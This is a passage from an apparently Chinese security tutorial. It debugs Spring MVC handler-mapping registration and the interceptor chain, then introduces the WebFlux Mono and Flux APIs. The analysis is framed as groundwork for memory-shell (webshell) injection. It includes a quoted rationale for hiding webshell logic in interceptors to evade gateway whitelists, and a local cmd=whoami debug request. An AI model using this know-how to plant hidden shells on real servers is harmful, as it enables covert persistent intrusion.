<p>这段代码和自带的注释写的也比较通俗易懂，分为两部分，第一部分是去<code>ApplicationContext</code>（包括<code>ancestor contexts</code>）里面找所有实现了<code>HandlerMappings</code>接口的类，如果找到了至少一个符合条件的<code>HandlerMapping bean</code>，那就把它的值转化为列表，并按照Java的默认排序机制对它们进行排序，最后将排序后的列表赋值给 <code>this.handlerMappings</code>；那如果没有找到，<code>this.handlerMappings</code>就依然保持为<code>null</code>；如果不需要检测所有处理程序映射，那就尝试从<code>ApplicationContext</code>中获取名称为 <code>handlerMapping</code> 的<code>bean</code>，如果成功获取到了则将其作为单一元素的列表赋值给 <code>this.handlerMappings</code>，如果获取失败了，那也没关系，因为人家注释里面讲的很明白，会添加一个默认的<code>HandlerMapping</code>，这也就是我们要讲的第二部分的代码。</p>
<p>第二部分说的是，如果之前一套操作下来，<code>this.handlerMappings</code>还是为<code>null</code>，那么就调用 <code>getDefaultStrategies</code> 方法去获取默认的<code>HandlerMapping</code>，并将其赋给 <code>this.handlerMappings</code>。</p>
<p>这么一看的话，<code>org.springframework.web.servlet.DispatcherServlet#getDefaultStrategies</code>这个方法还是挺关键的，我们点进去看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002045-57e49d74-c830-1.jpeg"/></p>
<p>这段代码挺有意思，先是加载资源文件，并将其内容以属性键值对的形式存储在<code>defaultStrategies</code>中；接下来从<code>strategyInterface</code>获取一个名称，然后用这个名称在<code>defaultStrategies</code>中查找相应的值，如果找到了，就将这个值按逗号分隔成类名数组，接着遍历这个类名数组，对于每个类名都执行以下两个操作：①尝试通过<code>ClassUtils.forName</code>方法加载该类 ②使用<code>createDefaultStrategy</code>方法创建该类的实例；最后将创建的策略对象添加到列表<code>strategies</code>中并返回。</p>
<p>那就很好奇了，这段代码中的<code>DEFAULT_STRATEGIES_PATH</code>里面有啥？<code>Ctrl+左键</code>追踪：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002048-59c0b628-c830-1.jpeg"/></p>
<p>原来是一个名叫<code>DispatcherServlet.properties</code>的文件，我们可以在左侧的依赖列表里面很快地翻到它，因为它应该是和<code>DispatcherServlet.java</code>在一块儿的：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002051-5b49f284-c830-1.jpeg"/></p>
<p>从文件内容中，我们可以很快地锁定关键信息：</p>
<div class="highlight"><pre><span></span><span class="na">org.springframework.web.servlet.HandlerMapping</span><span class="o">=</span><span class="s">org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,\</span>
<span class="s">    org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,\</span>
<span class="s">    org.springframework.web.servlet.function.support.RouterFunctionMapping</span>
</pre></div>
<p>也就是说，会有三个值，分别是<code>BeanNameUrlHandlerMapping</code>、<code>RequestMappingHandlerMapping</code>和<code>RouterFunctionMapping</code>，我们一般用的是第二个，我们点进<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code>看一下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002054-5d54589e-c830-1.jpeg"/></p>
<p>它的父类<code>RequestMappingInfoHandlerMapping</code>的父类<code>AbstractHandlerMethodMapping</code>实现了<code>InitializingBean</code>这个接口，这个接口用于在<code>bean</code>初始化完成后执行一些特定的自定义初始化逻辑。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002057-5ed5b80c-c830-1.jpeg"/></p>
<p>点进该接口，只有一个<code>afterPropertiesSet</code>方法，关于该方法的用途可以参考<code>https://www.python100.com/html/U711CO7MV79C.html</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002058-5f757be4-c830-1.jpeg"/></p>
<p>那我们就看看<code>AbstractHandlerMethodMapping</code>它是具体咋实现<code>InitializingBean</code>的<code>afterPropertiesSet</code>的吧：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002059-60513076-c830-1.jpeg"/></p>
<p>重写的也很简单，调用<code>initHandlerMethods</code>这个方法，继续跟踪该方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002101-6182e728-c830-1.jpeg"/></p>
<p>注释里面写的很清楚：扫描<code>ApplicationContext</code>中的<code>bean</code>，然后检测并注册<code>handler methods</code>。</p>
<p>我们在<code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#initHandlerMethods</code>这里打下断点进行调试，到图中这一步之后<code>step into</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002104-632a0214-c830-1.jpeg"/></p>
<p>我们来看<code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#processCandidateBean</code>这个方法的具体逻辑：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002106-64b773be-c830-1.jpeg"/></p>
<p>这里我们自然很好奇，这个<code>isHandler</code>是判断啥的，我们点进去看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002108-6594dcae-c830-1.jpeg"/></p>
<p>可以看到，这里并没有给出实现，说明子类中应该会给出<code>override</code>，于是直接找到了<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#isHandler</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002110-66b58e3a-c830-1.jpeg"/></p>
<p>很明显，<code>isHandler</code>是用来检测给定的<code>beanType</code>类是否带有<code>Controller</code>注解或者<code>RequestMapping</code>注解。</p>
<p>解决了这个，继续往后看，后面是调用了<code>detectHandlerMethods</code>这个方法，我们点进去看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002113-6865b340-c830-1.jpeg"/></p>
<p>我们分开来看，首先是这行代码，它是综合起来写的，意思是说，先判断<code>handler</code>是否是字符串类型，如果是，则通过<code>ApplicationContext</code>获取它的类型；否则，直接获取<code>handler</code>的类型。：</p>
<div class="highlight"><pre><span></span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">handlerType</span> <span class="o">=</span> <span class="o">(</span><span class="n">handler</span> <span class="k">instanceof</span> <span class="n">String</span> <span class="o">?</span>
            <span class="n">obtainApplicationContext</span><span class="o">().</span><span class="na">getType</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">handler</span><span class="o">)</span> <span class="o">:</span> <span class="n">handler</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span>
</pre></div>
<p>然后是这部分：</p>
<div class="highlight"><pre><span></span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">userType</span> <span class="o">=</span> <span class="n">ClassUtils</span><span class="o">.</span><span class="na">getUserClass</span><span class="o">(</span><span class="n">handlerType</span><span class="o">);</span>
<span class="n">Map</span><span class="o">&lt;</span><span class="n">Method</span><span class="o">,</span> <span class="n">T</span><span class="o">&gt;</span> <span class="n">methods</span> <span class="o">=</span> <span class="n">MethodIntrospector</span><span class="o">.</span><span class="na">selectMethods</span><span class="o">(</span><span class="n">userType</span><span class="o">,</span>
        <span class="o">(</span><span class="n">MethodIntrospector</span><span class="o">.</span><span class="na">MetadataLookup</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;)</span> <span class="n">method</span> <span class="o">-&gt;</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="k">return</span> <span class="n">getMappingForMethod</span><span class="o">(</span><span class="n">method</span><span class="o">,</span> <span class="n">userType</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalStateException</span><span class="o">(</span><span class="s">"Invalid mapping on handler class ["</span> <span class="o">+</span>
                        <span class="n">userType</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"]: "</span> <span class="o">+</span> <span class="n">method</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">});</span>
</pre></div>
<p>先是获取处理器的用户类，用户类是没有经过代理包装的类，这样就可以确保获取到的是实际处理请求的类；然后是这个<code>selectMethods</code>方法，这个方法有两个参数，第一个参数就是用户类，第二个参数是一个回调函数。关键就在于理解这个回调函数的作用。对于每个方法，它会尝试调用<code>getMappingForMethod</code>来获取方法的映射信息。</p>
<p>我们点进这个方法，发现它是一个抽象方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002114-69475a34-c830-1.jpeg"/></p>
<p>那就去看看他的子类中有没有对应的实现，直接定位到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#getMappingForMethod</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002116-6a618b92-c830-1.jpeg"/></p>
<p>我们在下图所示位置打断点调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002123-6e80c59e-c830-1.jpeg"/></p>
<p>分开来看，首先是第一行：</p>
<div class="highlight"><pre><span></span><span class="n">RequestMappingInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="n">createRequestMappingInfo</span><span class="o">(</span><span class="n">method</span><span class="o">);</span>
</pre></div>
<p>解析<code>Controller</code>类的方法中的注解，生成一个对应的<code>RequestMappingInfo</code>对象。我们可以<code>step into</code>进入<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002126-704eaa58-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002134-75037218-c830-1.jpeg"/></p>
<p>可以看到这个<code>info</code>里面保存了访问该方法的<code>url pattern</code>是<code>"/"</code>，也就是我们在<code>TestController.java</code>所想要看到的当<code>@RequestMapping("/")</code>时，调用<code>test</code>方法。</p>
<p>继续一步步往下走，可以看到走到了<code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#detectHandlerMethods</code>的最后：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002141-79568756-c830-1.jpeg"/></p>
<p>直接看<code>lambda</code>表达式里面的内容：</p>
<div class="highlight"><pre><span></span><span class="n">Method</span> <span class="n">invocableMethod</span> <span class="o">=</span> <span class="n">AopUtils</span><span class="o">.</span><span class="na">selectInvocableMethod</span><span class="o">(</span><span class="n">method</span><span class="o">,</span> <span class="n">userType</span><span class="o">);</span>
<span class="n">registerHandlerMethod</span><span class="o">(</span><span class="n">handler</span><span class="o">,</span> <span class="n">invocableMethod</span><span class="o">,</span> <span class="n">mapping</span><span class="o">);</span>
</pre></div>
<p>意思是，先用<code>selectInvocableMethod</code>方法根据<code>method</code>和<code>userType</code>选择出一个可调用的方法，这样是为了处理可能存在的代理和<code>AOP</code>的情况，确保获取到的是可直接调用的原始方法；然后把<code>bean</code>、<code>Method</code>和<code>RequestMappingInfo</code>注册进<code>MappingRegistry</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002149-7e1c4014-c830-1.jpeg"/></p>
<p>到这里，<code>url</code>和<code>Controller</code>之间的关系是如何建立的问题就解决了。</p>
<h4 data-content="1" id="30d8514c587ed1a57c755284eff9b5c7">2.11.2.3 Spring Interceptor引入与执行流程分析</h4>
<p>我们回顾之前聊到的<code>Controller</code>的思路和下面的<code>4.1</code>节中所展示的<code>Controller</code>内存马，可以考虑到这样一个问题：</p>
<blockquote>
<p>随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的<code>shell</code>路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入<code>java</code>内存马时，尽量不要使用新的路由来专门处理我们注入的<code>webshell</code>逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们<code>webshell</code>逻辑的处理。在<code>tomcat</code>容器下，有<code>filter</code>、<code>listener</code>等技术可以达到上述要求。那么在 <code>spring</code> 框架层面下，有办法达到上面所说的效果吗？      ——摘编自<code>https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md</code>和<code>https://landgrey.me/blog/19/</code></p>
</blockquote>
<p>答案是当然有，这就是我们要讲的<code>Spring Interceptor</code>，<code>Spring</code>框架中的一种拦截器机制。</p>
<p>那就不禁要问了：这个<code>Spring Interceptor</code>和我们之前所说的<code>Filter</code>的区别是啥？</p>
<blockquote>
<p>参考：<a href="https://developer.aliyun.com/article/925400" target="_blank">https://developer.aliyun.com/article/925400</a></p>
</blockquote>
<p>主要有以下六个方面：</p>
<table>
<thead>
<tr>
<th>主要区别</th>
<th>拦截器</th>
<th>过滤器</th>
</tr>
</thead>
<tbody>
<tr>
<td>机制</td>
<td>
<code>Java</code>反射机制</td>
<td>函数回调</td>
</tr>
<tr>
<td>是否依赖<code>Servlet</code>容器</td>
<td>不依赖</td>
<td>依赖</td>
</tr>
<tr>
<td>作用范围</td>
<td>对<code>action</code>请求起作用</td>
<td>对几乎所有请求起作用</td>
</tr>
<tr>
<td>是否可以访问上下文和值栈</td>
<td>可以访问</td>
<td>不能访问</td>
</tr>
<tr>
<td>调用次数</td>
<td>可以多次被调用</td>
<td>在容器初始化时只被调用一次</td>
</tr>
<tr>
<td>
<code>IOC</code>容器中的访问</td>
<td>可以获取<code>IOC</code>容器中的各个<code>bean</code>（基于<code>FactoryBean</code>接口）</td>
<td>不能在<code>IOC</code>容器中获取<code>bean</code>
</td>
</tr>
</tbody>
</table>
<p>我们在<code>2.10.2</code>节中给出的<code>TestInterceptor.java</code>的<code>preHandle</code>函数这里下断点，然后访问<code>http://127.0.0.1:8080/?cmd=whoami</code>进入调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002152-801c1768-c830-1.jpeg"/></p>
<p>一步步步入调试之后，发现进入<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002208-8949f85a-c830-1.jpeg"/></p>
<p>我们在<code>doDispatch</code>方法的第一行下断点，重新访问页面调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002220-90d22c3c-c830-1.jpeg"/></p>
<p>看到了调用了<code>getHandler</code>这个函数，它的注释写的简单易懂：确定处理当前请求的<code>handler</code>，我们<code>step into</code>看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002239-9bb7c5f8-c830-1.jpeg"/></p>
<p>通过遍历当前<code>handlerMapping</code>数组中的<code>handler</code>对象，来判断哪个<code>handler</code>来处理当前的<code>request</code>对象：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002244-9f211c80-c830-1.jpeg"/></p>
<p>继续步入这个函数里面所用到的<code>mapping.getHandler</code>方法，也就是<code>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002250-a26682c2-c830-1.jpeg"/></p>
<p>代码简单易懂，先是通过<code>getHandlerInternal</code>来获取，如果获取不到，那就调用<code>getDefaultHandler</code>来获取默认的，如果还是获取不到，就直接返回<code>null</code>；然后检查<code>handler</code>是不是一个字符串，如果是，说明可能是一个<code>Bean</code>的名字，这样的话就通过<code>ApplicationContext</code>来获取对应名字的<code>Bean</code>对象，这样就确保 <code>handler</code> 最终会是一个合法的处理器对象；接着检查是否已经有缓存的请求路径，如果没有缓存就调用 <code>initLookupPath(request)</code> 方法来初始化请求路径的查找；最后通过 <code>getHandlerExecutionChain</code> 方法创建一个处理器执行链。</p>
<p>这么看下来，这个<code>getHandlerExecutionChain</code>方法很重要，我们步入看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002253-a4386c46-c830-1.jpeg"/></p>
<p>遍历<code>adaptedInterceptors</code>，判断拦截器是否是<code>MappedInterceptor</code>类型，如果是那就看<code>MappedInterceptor</code>是否匹配当前请求，如果匹配则将其实际的拦截器添加到执行链中，如果不是这个类型的那就直接将拦截器添加到执行链中。</p>
<p>再回到之前的<code>getHandler</code>方法中来，看看它的后半段：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002258-a721cb28-c830-1.jpeg"/></p>
<p>主要都是处理跨域资源共享（<code>CORS</code>）的逻辑，只需要知道在涉及<code>CORS</code>的时候把<code>request</code>、<code>executionChain</code>和<code>CORS</code>配置通过<code>getCorsHandlerExecutionChain</code>调用封装后返回就行了。</p>
<p>一步步执行回到一开始的<code>getHandler</code>中，这里就是调用<code>org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle</code>方法来遍历所有拦截器进行预处理，后面的代码就基本不需要了解了：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002301-a9048a20-c830-1.jpeg"/></p>
<h2 data-content="1" id="a4ed67aef046989ec414824aa8b97036">2.12 Spring WebFlux介绍与代码调试分析</h2>
<p><code>SpringWebFlux</code>是<code>Spring Framework 5.0</code>中引入的新的响应式<code>web</code>框架。传统的<code>Spring MVC</code>在处理请求时是阻塞的，即每个请求都会占用一个线程，如果有大量请求同时到达，就需要大量线程来处理，可能导致资源耗尽。为了解决这个问题，<code>WebFlux</code>引入了非阻塞的响应式编程模型，通过使用异步非阻塞的方式处理请求，能够更高效地支持大量并发请求，提高系统的吞吐量；并且它能够轻松处理长连接和<code>WebSocket</code>，适用于需要保持连接的应用场景，如实时通讯和推送服务；在微服务架构中，服务之间的通信往往需要高效处理，<code>WebFlux</code>可以更好地适应这种异步通信的需求。</p>
<p>关于<code>Reactive</code>和<code>Spring WebFlux</code>的相关知识，可以参考知乎上的这篇文章，讲的通俗易懂，很透彻：</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/559158740" target="_blank">https://zhuanlan.zhihu.com/p/559158740</a></p>
</blockquote>
<p><code>WebFlux</code>框架开发的接口返回类型必须是<code>Mono&lt;T&gt;</code>或者是<code>Flux&lt;T&gt;</code>。因此我们第一个需要了解的就是什么是<code>Mono</code>以及什么是<code>Flux</code>。</p>
<h3 data-content="1" id="c3fbd1be11762049828d66d4bfe75b61">2.12.1 什么是Mono？</h3>
<p><code>Mono</code>用来表示包含<code>0</code>或<code>1</code>个元素的异步序列，它是一种异步的、可组合的、能够处理异步数据流的类型。比方说当我们发起一个异步的数据库查询、网络调用或其他异步操作时，该操作的结果可以包装在<code>Mono</code>中，这样就使得我们可以以响应式的方式处理异步结果，而不是去阻塞线程等待结果返回，就像我们在<code>2.10.3</code>节中的那张<code>gif</code>图中所看到的那样。</p>
<p>下面我们来看看<code>Mono</code>常用的<code>api</code>：</p>
<table>
<thead>
<tr>
<th style="">API</th>
<th style="">说明</th>
<th style="">代码示例</th>
</tr>
</thead>
<tbody>
<tr>
<td style=""><code>Mono.just(T data)</code></td>
<td style="">创建一个包含指定数据的 <code>Mono</code>。</td>
<td style=""><code>Mono&lt;String&gt; mono = Mono.just("Hello, Mono!");</code></td>
</tr>
<tr>
<td style=""><code>Mono.empty()</code></td>
<td style="">创建一个空的 <code>Mono</code>。</td>
<td style=""><code>Mono&lt;Object&gt; emptyMono = Mono.empty();</code></td>
</tr>
<tr>
<td style=""><code>Mono.error(Throwable error)</code></td>
<td style="">创建一个包含错误的 <code>Mono</code>。</td>
<td style=""><code>Mono&lt;Object&gt; errorMono = Mono.error(new RuntimeException("Something went wrong"));</code></td>
</tr>
<tr>
<td style=""><code>Mono.fromCallable(Callable&lt;T&gt; supplier)</code></td>
<td style="">从 Callable 创建 <code>Mono</code>，表示可能抛出异常的异步操作。</td>
<td style=""><code>Mono&lt;String&gt; resultMono = Mono.fromCallable(() -&gt; expensiveOperation());</code></td>
</tr>
<tr>
<td style=""><code>Mono.fromRunnable(Runnable runnable)</code></td>
<td style="">从 Runnable 创建 <code>Mono</code>，表示没有返回值的异步操作。</td>
<td style=""><code>Mono&lt;Void&gt; runnableMono = Mono.fromRunnable(() -&gt; performAsyncTask());</code></td>
</tr>
<tr>
<td style=""><code>Mono.delay(Duration delay)</code></td>
<td style="">在指定的延迟后创建一个空的 <code>Mono</code>。</td>
<td style=""><code>Mono&lt;Object&gt; delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just("Delayed Result"));</code></td>
</tr>
<tr>
<td style=""><code>Mono.defer(Supplier&lt;? extends Mono&lt;? extends T&gt;&gt; supplier)</code></td>
<td style="">延迟创建 <code>Mono</code>，直到订阅时才调用供应商方法。</td>
<td style=""><code>Mono&lt;String&gt; deferredMono = Mono.defer(() -&gt; Mono.just("Deferred Result"));</code></td>
</tr>
<tr>
<td style=""><code>Mono.whenDelayError(Iterable&lt;? extends Mono&lt;? extends T&gt;&gt; monos)</code></td>
<td style="">将一组 <code>Mono</code> 合并为一个 <code>Mono</code>，当其中一个出错时，继续等待其他的完成。</td>
<td style=""><code>Mono&lt;String&gt; resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3));</code></td>
</tr>
<tr>
<td style=""><code>Mono.map(Function&lt;? super T, ? extends V&gt; transformer)</code></td>
<td style="">对 <code>Mono</code> 中的元素进行映射。</td>
<td style=""><code>Mono&lt;Integer&gt; resultMono = mono.map(s -&gt; s.length());</code></td>
</tr>
<tr>
<td style=""><code>Mono.flatMap(Function&lt;? super T, ? extends Mono&lt;? extends V&gt;&gt; transformer)</code></td>
<td style="">对 <code>Mono</code> 中的元素进行异步映射。</td>
<td style=""><code>Mono&lt;Integer&gt; resultMono = mono.flatMap(s -&gt; Mono.just(s.length()));</code></td>
</tr>
<tr>
<td style=""><code>Mono.filter(Predicate&lt;? super T&gt; tester)</code></td>
<td style="">过滤 <code>Mono</code> 中的元素。</td>
<td style=""><code>Mono&lt;String&gt; filteredMono = mono.filter(s -&gt; s.length() &gt; 5);</code></td>
</tr>
<tr>
<td style=""><code>Mono.defaultIfEmpty(T defaultVal)</code></td>
<td style="">如果 <code>Mono</code> 为空，则使用默认值。</td>
<td style=""><code>Mono&lt;String&gt; resultMono = mono.defaultIfEmpty("Default Value");</code></td>
</tr>
<tr>
<td style=""><code>Mono.onErrorResume(Function&lt;? super Throwable, ? extends Mono&lt;? extends T&gt;&gt; fallback)</code></td>
<td style="">在发生错误时提供一个备用的 <code>Mono</code>。</td>
<td style=""><code>Mono&lt;String&gt; resultMono = mono.onErrorResume(e -&gt; Mono.just("Fallback Value"));</code></td>
</tr>
<tr>
<td style=""><code>Mono.doOnNext(Consumer&lt;? super T&gt; consumer)</code></td>
<td style="">在成功时执行操作，但不更改元素。</td>
<td style=""><code>Mono&lt;String&gt; resultMono = mono.doOnNext(s -&gt; System.out.println("Received: " + s));</code></td>
</tr>
<tr>
<td style=""><code>Mono.doOnError(Consumer&lt;? super Throwable&gt; onError)</code></td>
<td style="">在发生错误时执行操作。</td>
<td style=""><code>Mono&lt;String&gt; resultMono = mono.doOnError(e -&gt; System.err.println("Error: " + e.getMessage()));</code></td>
</tr>
<tr>
<td style=""><code>Mono.doFinally(Consumer&lt;SignalType&gt; action)</code></td>
<td style="">无论成功还是出错都执行操作。</td>
<td style=""><code>Mono&lt;String&gt; resultMono = mono.doFinally(signal -&gt; System.out.println("Processing finished: " + signal));</code></td>
</tr>
</tbody>
</table>
<h3 data-content="1" id="414e07ed2b56f4963248e3650ac50517">2.12.2 什么是Flux？</h3>
<p><code>Flux</code>表示的是<code>0</code>到<code>N</code>个元素的异步序列，可以以异步的方式按照时间的推移逐个或一批一批地<code>publish</code>元素。也就是说，<code>Flux</code>允许在处理元素的过程中，不必等待所有元素都准备好，而是可以在它们准备好的时候立即推送给订阅者。这种异步的推送方式使得程序可以更灵活地处理元素的生成和消费，而不会阻塞执行线程。</p>
<p>下面是<code>Flux</code>常用的<code>api</code>：</p>
<table>
<thead>
<tr>
<th style="">API</th>
<th style="">说明</th>
<th style="">代码示例</th>
</tr>
</thead>
<tbody>
<tr>
<td style=""><strong><code>Flux.just</code></strong></td>
<td style="">创建包含指定元素的<code>Flux</code>
</td>
<td style=""><code>Flux&lt;String&gt; flux = Flux.just("A", "B", "C");</code></td>
</tr>
<tr>
<td style=""><strong><code>Flux.fromIterable</code></strong></td>
<td style="">从<code>Iterable</code>创建<code>Flux</code>
</td>
<td style="">
<code>List&lt;String&gt; list = Arrays.asList("A", "B", "C");</code><br/><code>Flux&lt;String&gt; flux = Flux.fromIterable(list);</code>
</td>
</tr>
<tr>
<td style=""><strong><code>Flux.fromArray</code></strong></td>
<td style="">从数组创建<code>Flux</code>
</td>
<td style="">
<code>String[] array = {"A", "B", "C"};</code><br/><code>Flux&lt;String&gt; flux = Flux.fromArray(array);</code>
</td>
</tr>
<tr>
<td style=""><strong><code>Flux.empty</code></strong></td>
<td style="">创建一个空的<code>Flux</code>
</td>
<td style=""><code>Flux&lt;Object&gt; emptyFlux = Flux.empty();</code></td>
</tr>
<tr>
<td style=""><strong><code>Flux.error</code></strong></td>
<td style="">创建一个包含错误的<code>Flux</code>
</td>
<td style=""><code>Flux&lt;Object&gt; errorFlux = Flux.error(new RuntimeException("Something went wrong"));</code></td>
</tr>
<tr>
<td style=""><strong><code>Flux.range</code></strong></td>
<td style="">创建包含指定范围的整数序列的<code>Flux</code>
</td>
<td style=""><code>Flux&lt;Integer&gt; rangeFlux = Flux.range(1, 5);</code></td>
</tr>
<tr>
<td style=""><strong><code>Flux.interval</code></strong></td>
<td style="">创建包含定期间隔的元素的<code>Flux</code>
</td>
<td style=""><code>Flux&lt;Long&gt; intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5);</code></td>
</tr>
<tr>
<td style=""><strong><code>Flux.merge</code></strong></td>
<td style="">合并多个Flux，按照时间顺序交织元素</td>
<td style="">
<code>Flux&lt;String&gt; flux1 = Flux.just("A", "B");</code><br/><code>Flux&lt;String&gt; flux2 = Flux.just("C", "D");</code><br/><code>Flux&lt;String&gt; mergedFlux = Flux.merge(flux1, flux2);</code>
</td>
</tr>
<tr>
<td style=""><strong><code>Flux.concat</code></strong></td>
<td style="">连接多个<code>Flux</code>，按照顺序发布元素</td>
<td style="">
<code>Flux&lt;String&gt; flux1 = Flux.just("A", "B");</code><br/><code>Flux&lt;String&gt; flux2 = Flux.just("C", "D");</code><br/><code>Flux&lt;String&gt; concatenatedFlux = Flux.concat(flux1, flux2);</code>
</td>
</tr>
<tr>
<td style=""><strong><code>Flux.zip</code></strong></td>
<td style="">将多个<code>Flux</code>的元素进行配对，生成<code>Tuple</code>
</td>
<td style="">
<code>Flux&lt;String&gt; flux1 = Flux.just("A", "B");</code><br/><code>Flux&lt;String&gt; flux2 = Flux.just("1", "2");</code><br/><code>Flux&lt;Tuple2&lt;String, String&gt;&gt; zippedFlux = Flux.zip(flux1, flux2);</code>
</td>
</tr>
<tr>
<td style=""><strong><code>Flux.filter</code></strong></td>
<td style="">过滤满足条件的元素</td>
<td style="">
<code>Flux&lt;Integer&gt; numbers = Flux.range(1, 5);</code><br/><code>Flux&lt;Integer&gt; filteredFlux = numbers.filter(n -&gt; n % 2 == 0);</code>
</td>
</tr>
<tr>
<td style=""><strong><code>Flux.map</code></strong></td>
<td style="">转换每个元素的值</td>
<td style="">
<code>Flux&lt;String&gt; words = Flux.just("apple", "banana", "cherry");</code><br/><code>Flux&lt;Integer&gt; wordLengths = words.map(String::length);</code>
</td>
</tr>
<tr>
<td style=""><strong><code>Flux.flatMap</code></strong></td>
<td style="">将每个元素映射到一个<code>Flux</code>，并将结果平铺</td>
<td style="">
<code>Flux&lt;String&gt; letters = Flux.just("A", "B", "C");</code><br/><code>Flux&lt;String&gt; flatMappedFlux = letters.flatMap(letter -&gt; Flux.just(letter, letter.toLowerCase()));</code>
</td>
</tr>
</tbody>
</table>
<h3 data-content="1" id="964e23b72c2f62d99556b7ca1b7fc924">2.12.3 Spring WebFlux启动过程分析</h3>
<p>本来是想先用文字聊一堆关于<code>Spring MVC</code>和<code>Spring WebFlux</code>之间的区别的，但是这个已经被网上现有的不多的关于<code>WebFlux</code>的文章讲烂了，大家随便搜都可以搜到，皮毛性的东西纯属浪费时间，于是我们直接看代码，去深挖<code>WebFlux</code>的调用过程，从中我们自然可以发现这两者在调用过程中的类似和不同的地方。</p>
<p>我们直接在<code>run</code>方法这里下断点，然后直接<code>step into</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002303-aa7ca6ee-c830-1.jpeg"/></p>
<p>一步步地<code>step over</code>之后，我们可以看到调用了<code>org.springframework.boot.SpringApplication#createApplicationContext</code>这个方法（前面的那些方法并不重要，直接略过就行）：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002308-ad4f6f00-c830-1.jpeg"/></p>
<p>这个方法光听名字<code>createApplicationContext</code>，就感觉很重要，因为字面意思就是创建<code>ApplicationContext</code>，这正是我们感兴趣的内容，我们<code>step into</code>进去看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002314-b092dabc-c830-1.jpeg"/></p>
<p>可以看到，是根据不同的<code>webApplicationType</code>去选择创建不同的<code>context</code>，比如我们这里的<code>webApplicationType</code>就是<code>REACTIVE</code>，也就是响应式的。</p>
<p>我们<code>step into</code>这里的<code>create</code>方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211002323-b642af5a-c830-1.jpeg"/></p>
